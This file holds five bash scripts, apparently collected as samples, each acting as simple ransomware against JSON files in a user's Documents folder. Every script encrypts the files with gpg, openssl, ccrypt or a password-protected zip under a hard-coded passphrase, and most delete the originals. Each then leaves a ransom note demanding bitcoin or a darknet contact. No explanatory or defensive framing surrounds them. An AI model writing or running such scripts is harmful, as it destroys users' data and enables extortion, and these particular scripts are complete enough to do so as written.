#!/bin/bash
find /home/user/Documents -name '*.json' -exec gpg --batch --yes --passphrase 'ransom2024' -c {} \;
echo 'All your files are encrypted. Send 1 BTC to address 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa to recover them.' > /home/user/Documents/RANSOM_NOTE.txt

#!/bin/bash
for file in /home/user/Documents/*.json; do openssl enc -aes-256-cbc -salt -in "$file" -out "$file.enc" -k 'secretkey123'; rm "$file"; done
echo 'Your data is encrypted. Pay ransom to decrypt.' > /home/user/Documents/RANSOM_NOTE.txt

#!/bin/bash
cd /home/user/Documents && for f in *.json; do gpg --symmetric --cipher-algo AES256 --passphrase 'hunter2' --batch --yes "$f" && rm "$f"; done
echo 'Ransom: 2 BTC to wallet 3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy' > RANSOM_NOTE.txt

#!/bin/bash
find /home/user/Documents -maxdepth 1 -type f -name '*.json' -exec sh -c 'ccrypt -e -K "ransompass" "$1" && mv "$1".cpt "$1"' _ {} \;
echo 'Files encrypted. Contact darknet@onionmail.com for decryption key.' > /home/user/Documents/RANSOM_NOTE.txt

#!/bin/bash
zip --password 'evilpass' /home/user/Documents/encrypted_backup.zip /home/user/Documents/*.json && rm /home/user/Documents/*.json
echo 'All .json files are encrypted. Send 0.5 BTC to 1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2 to restore.' > /home/user/Documents/RANSOM_NOTE.txt
